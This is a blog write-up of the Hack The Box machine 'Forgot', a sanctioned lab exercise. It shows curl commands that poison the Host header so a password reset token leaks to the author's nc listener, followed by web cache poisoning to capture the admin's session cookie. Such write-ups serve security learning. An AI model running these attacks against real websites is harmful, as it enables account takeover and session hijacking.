<!doctype html><html lang="en"><head><title>Forgot | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Medium machine. This machine has a website that is vulnerable to password reset poisoning and web cache poisoning. Both vulnerabilities can be used to gain access with a normal account and then get the administrator&rsquo;s cookie, respectively. After that, we can read a ticket with SSH credentials. Then, we can run a Machine Learning script as root using sudo, and there is a library with a vulnerable version where we can inject Python code to escalate privileges"><meta name="image" content="https://7rocky.github.io/images/HTB/Forgot/Forgot.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Medium machine. This machine has a website that is vulnerable to password reset poisoning and web cache poisoning. Both vulnerabilities can be used to gain access with a normal account and then get the administrator&rsquo;s cookie, respectively. After that, we can read a ticket with SSH credentials. Then, we can run a Machine Learning script as root using sudo, and there is a library with a vulnerable version where we can inject Python code to escalate privileges"><meta itemprop="keywords" content="cve,python,sudo,code-injection,password-reuse,cache-poisoning,cookie-hijacking,"><meta itemprop="name" content="Forgot"><meta property="article:published_time" content="2023-03-04T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine has a website that is vulnerable to password reset poisoning and web cache poisoning. Both vulnerabilities can be used to gain access with a normal account and then get the administrator&rsquo;s cookie, respectively. After that, we can read a ticket with SSH credentials. Then, we can run a Machine Learning script as root using sudo, and there is a library with a vulnerable version where we can inject Python code to escalate privileges"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Forgot/Forgot.webp"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Forgot"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/forgot/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Hack The Box. Linux. Medium machine. This machine has a website that is vulnerable to password reset poisoning and web cache poisoning. Both vulnerabilities can be used to gain access with a normal account and then get the administrator&rsquo;s cookie, respectively. After that, we can read a ticket with SSH credentials. Then, we can run a Machine Learning script as root using sudo, and there is a library with a vulnerable version where we can inject Python code to escalate privileges"><meta name="twitter:description" content="Hack The Box. Linux. Medium machine. This machine has a website that is vulnerable to password reset poisoning and web cache poisoning. Both vulnerabilities can be used to gain access with a normal account and then get the administrator&rsquo;s cookie, respectively. After that, we can read a ticket with SSH credentials. Then, we can run a Machine Learning script as root using sudo, and there is a library with a vulnerable version where we can inject Python code to escalate privileges"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Forgot/Forgot.webp"><meta name="twitter:title" content="Forgot"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/htb/forgot/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/forgot/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/forgot/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/forgot/&amp;text=Forgot" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/forgot/&amp;title=Forgot" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Forgot</h1><time class="mt4 f6 dib tracked" datetime="2023-03-04T00:00:00+01:00">04 / 03 / 2023</time><br><p class="mb4 f6 dib tracked">12 minutes to read</p></header><div class="htb-image"><img alt="Forgot" src="/images/HTB/Forgot/Forgot.webp"><br><div class="htb-description bg-card">Hack The Box. Linux. Medium machine. This machine has a website that is vulnerable to password reset poisoning and web cache poisoning. Both vulnerabilities can be used to gain access with a normal account and then get the administrator&rsquo;s cookie, respectively. After that, we can read a ticket with SSH credentials. Then, we can run a Machine Learning script as <code>root</code> using <code>sudo</code>, and there is a library with a vulnerable version where we can inject Python code to escalate privileges</div></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/python" title="Python">Python</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/sudo" title="<code>sudo</code>"><code>sudo</code></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/code-injection" title="Code Injection">Code Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/password-reuse" title="Password reuse">Password reuse</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cache-poisoning" title="Cache poisoning">Cache poisoning</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cookie-hijacking" title="Cookie Hijacking">Cookie Hijacking</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a><ul><li><a href="#password-reset-poisoning">Password reset poisoning</a></li><li><a href="#web-cache-poisoning">Web cache poisoning</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#code-injection">Code injection</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.188</li><li><strong>Release</strong>: 12 / 11 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.188 -p 22,80
Nmap scan report for 10.10.11.188
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
|_http-title: Login
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date:
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 32794
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     &lt;!doctype html&gt;
|     &lt;html lang=en&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest:
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date:
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 32789
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     &lt;!doctype html&gt;
|     &lt;html lang=en&gt;
|     &lt;title&gt;Redirecting...&lt;/title&gt;
|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href="http://127.0.0.1"&gt;http://127.0.0.1&lt;/a&gt;. If not, click the link.  
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date:
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     X-Varnish: 34
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions:
|_    HTTP/1.1 400 Bad Request

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 157.20 seconds
</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.11.188</code>, we will see this website:</p><p><img alt="Forgot 1" src="/images/HTB/Forgot/Forgot-1.webp"></p><p>It is a login form, but we don&rsquo;t have any credentials. Plus, there is a page to recover forgotten passwords:</p><p><img alt="Forgot 2" src="/images/HTB/Forgot/Forgot-2.webp"></p><p>Here we have a way to enumerate users (for instance, <code>admin</code> exists):</p><p><img alt="Forgot 3" src="/images/HTB/Forgot/Forgot-3.webp"></p><p><img alt="Forgot 4" src="/images/HTB/Forgot/Forgot-4.webp"></p><p>If we take a look at the response headers, we see that the server uses Python (probably Flask) and there are references to Varnish:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -I 10.10.11.188
HTTP/1.1 200 OK
<span class="code-white">Server</span>: Werkzeug/2.1.2 Python/3.8.10
<span class="code-white">Date</span>:
<span class="code-white">Content-Type</span>: text/html; charset=utf-8  
<span class="code-white">Content-Length</span>: 5187
<span class="code-white">X-Varnish</span>: 148147 313511
<span class="code-white">Age</span>: 8
<span class="code-white">Via</span>: 1.1 varnish (Varnish/6.2)
<span class="code-white">Accept-Ranges</span>: bytes
<span class="code-white">Connection</span>: keep-alive
</code></pre></div><p>Varnish is a web cache, as shown in <a target="_blank" href="https://www.varnish-software.com">www.varnish-software.com</a>:</p><p><img alt="Forgot 5" src="/images/HTB/Forgot/Forgot-5.webp"></p><p>Actually, this is noticeable when requesting the same resource multiple times. The first response takes about 2 seconds to return, whereas the following requests to the same resources only take a few milliseconds:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">time</span> curl <span class="code-dark-yellow">'10.10.11.188/forgot?username=admin'</span> -s &gt;<span class="mtku">/dev/null</span>  
        2,95 real         0,00 user         0,00 sys

<span class="code-cyan">$</span> <span class="code-dark-green">time</span> curl <span class="code-dark-yellow">'10.10.11.188/forgot?username=admin'</span> -s &gt;<span class="mtku">/dev/null</span>
        0,25 real         0,01 user         0,00 sys

<span class="code-cyan">$</span> <span class="code-dark-green">time</span> curl <span class="code-dark-yellow">'10.10.11.188/forgot?username=admin'</span> -s &gt;<span class="mtku">/dev/null</span>
        0,22 real         0,01 user         0,00 sys

<span class="code-cyan">$</span> <span class="code-dark-green">time</span> curl <span class="code-dark-yellow">'10.10.11.188/forgot?username=asdf'</span> -s &gt;<span class="mtku">/dev/null</span>
        2,37 real         0,01 user         0,00 sys

<span class="code-cyan">$</span> <span class="code-dark-green">time</span> curl <span class="code-dark-yellow">'10.10.11.188/forgot?username=asdf'</span> -s &gt;<span class="mtku">/dev/null</span>
        0,21 real         0,01 user         0,00 sys

<span class="code-cyan">$</span> <span class="code-dark-green">time</span> curl <span class="code-dark-yellow">'10.10.11.188/forgot?username=asdf'</span> -s &gt;<span class="mtku">/dev/null</span>
        0,20 real         0,01 user         0,00 sys
</code></pre></div><p>For the moment, let&rsquo;s enumerate more routes using <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://10.10.11.188/FUZZ  

<span class="code-dark-green">[Status: 200, Size: 5189, Words: 762, Lines: 246, Duration: 78ms]</span>
    * FUZZ: login

<span class="code-dark-blue">[Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 85ms]</span>
    * FUZZ: home

<span class="code-dark-blue">[Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 57ms]</span>
    * FUZZ: tickets

<span class="code-dark-green">[Status: 200, Size: 5523, Words: 820, Lines: 261, Duration: 120ms]</span>
    * FUZZ: reset

<span class="code-dark-green">[Status: 200, Size: 5227, Words: 766, Lines: 253, Duration: 2501ms]</span>
    * FUZZ: forgot
</code></pre></div><h2 id="foothold">Foothold</h2><p>We see <code>/reset</code>:</p><p><img alt="Forgot 6" src="/images/HTB/Forgot/Forgot-6.webp"></p><p>But we need a token&mldr;</p><p><img alt="Forgot 7" src="/images/HTB/Forgot/Forgot-7.webp"></p><h3 id="password-reset-poisoning">Password reset poisoning</h3><p>Since there are no more functionalities in the website and common injections do not work (SQLi / NoSQLi), we need to do a bit of research. The name of the machine (&ldquo;Forgot&rdquo;) and the functionality to restore forgot passwords are hints to the attack we need to perform. There is a good post by <a target="_blank" href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning">portswigger.net</a> explaining how password reset poisoning works.</p><p>The key is to enter our managed server IP address in the <code>Host</code> header, so that the cache gets poisoned. Then, the legitimate user will go to our server with the reset token because the <code>Host</code> header was poisoned:</p><p><img alt="Forgot 8" src="/images/HTB/Forgot/Forgot-8.webp"></p><p><em>Source</em>: <a target="_blank" href="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning">https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning</a></p><p>The attack seems simple. But first of all, we need to find a valid user different to <code>admin</code>.</p><p>Unexpectedly, there was an HTML comment in the main page with a random user:</p><p><img alt="Forgot 9" src="/images/HTB/Forgot/Forgot-9.webp"></p><p>Now we are able to reset his password:</p><p><img alt="Forgot 10" src="/images/HTB/Forgot/Forgot-10.webp"></p><p>Let&rsquo;s switch to <code>curl</code> to poison the cache while listening on port 80 with <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.188/forgot?username=robert-dev-10036'</span> -H <span class="code-dark-yellow">'Host: 10.10.17.44'</span>
Password reset link has been sent to user inbox. Please use the link to reset your password  

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.188/forgot?username=robert-dev-10036'</span> -H <span class="code-dark-yellow">'Host: 10.10.17.44'</span>
Password reset link has been sent to user inbox. Please use the link to reset your password

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.188/forgot?username=robert-dev-10036'</span> -H <span class="code-dark-yellow">'Host: 10.10.17.44'</span>
Password reset link has been sent to user inbox. Please use the link to reset your password

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.188/forgot?username=robert-dev-10036'</span> -H <span class="code-dark-yellow">'Host: 10.10.17.44'</span>
Password reset link has been sent to user inbox. Please use the link to reset your password

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.188/forgot?username=robert-dev-10036'</span> -H <span class="code-dark-yellow">'Host: 10.10.17.44'</span>
Password reset link has been sent to user inbox. Please use the link to reset your password
</code></pre></div><p>After a few seconds, we receive a hit in <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.188.
Ncat: Connection from 10.10.11.188:51006.
GET /reset?token=uOnf6gEMfSAM3HBvxaAAkJ9u4CRYqMBvdD%2BVI2bRCyb4aLOj7b0m8RcrTtCyMlTlLAIhl2kA72PFz%2Be6vy4t%2Fg%3D%3D HTTP/1.1  
Host: 10.10.17.44
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
</code></pre></div><p>Incredible, we have the password reset token. Let&rsquo;s change the password then:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.188/reset?token=uOnf6gEMfSAM3HBvxaAAkJ9u4CRYqMBvdD%2BVI2bRCyb4aLOj7b0m8RcrTtCyMlTlLAIhl2kA72PFz%2Be6vy4t%2Fg%3D%3D'</span> -d <span class="code-dark-yellow">'password=asdf'</span>  
Success
</code></pre></div><p>Great, now we have access as a valid user:</p><p><img alt="Forgot 11" src="/images/HTB/Forgot/Forgot-11.webp"></p><p>In <code>/tickets</code> we can see some reported issues:</p><p><img alt="Forgot 12" src="/images/HTB/Forgot/Forgot-12.webp"></p><p>For instance, there is one that told about SSH credentials. There is also another page in <code>/escalate</code>:</p><p><img alt="Forgot 13" src="/images/HTB/Forgot/Forgot-13.webp"></p><p>Here we can send some requests that will be read by Admin. In this type of forms, we can try to inject XSS or CSRF payloads to see if there is HTML injection or JavaScript execution on the Admin&rsquo;s side. Nevertheless, this time it is not vulnerable.</p><h3 id="web-cache-poisoning">Web cache poisoning</h3><p>We must recall that there was a web cache, which is Varnish version 6.2.0. This software has a few CVE, but there is no clear exploit. The key thing is that Admin will follow the link we enter in the form. But there is a filter, for instance, we cannot enter our own IP address or <code>localhost</code>. There are some articles at <a target="_blank" href="https://portswigger.net/research/web-cache-entanglement">portswigger.net</a> that explain how web caches can be compromised.</p><p>Since we will be dealing with a web cache, probably it is storing static contents (mainly CSS and JavaScript files). The idea is to make Admin request one of this files, so that the response is cached. The file must not exist beforehand:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.188/escalate -H <span class="code-dark-yellow">'Cookie: session=c4d1925a-a30d-4d9e-b652-a23924069b7c'</span> -d <span class="code-dark-yellow">'to=Admin&link=http://10.10.11.188/static/js/asdf.js&reason=r&issue=Getting error while accessing search feature in enterprise platform.'</span>  
Escalation form submitted to Admin and will be reviewed soon!
</code></pre></div><p>After a few seconds and a lot of trial and error, a new session cookie is found when requesting the static file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.188/static/js/asdf.js -sI | <span class="code-dark-green">grep</span> Cookie
Set-<span class="code-red">Cookie</span>: session=d0041078-2303-4bf4-a109-83e7979ed453; HttpOnly; Path=/  
